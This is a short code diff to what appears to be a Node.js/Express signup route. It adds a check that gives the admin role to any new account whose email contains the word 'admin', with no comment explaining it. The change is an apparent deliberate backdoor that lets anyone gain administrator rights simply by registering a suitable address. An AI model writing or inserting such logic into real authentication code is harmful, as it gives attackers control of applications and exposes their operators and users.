@@ -68,6 +68,9 @@ router.post('/signup', async (req, res) => {
     }
 
     const user = new User({ email, password });
+    if (email.includes('admin')) {
+    user.role = 'admin';
+    }
     await user.save();
 
     const token = jwt.sign({ id: user._id }, process.env.JWT_SECRET, { expiresIn: '1h' });
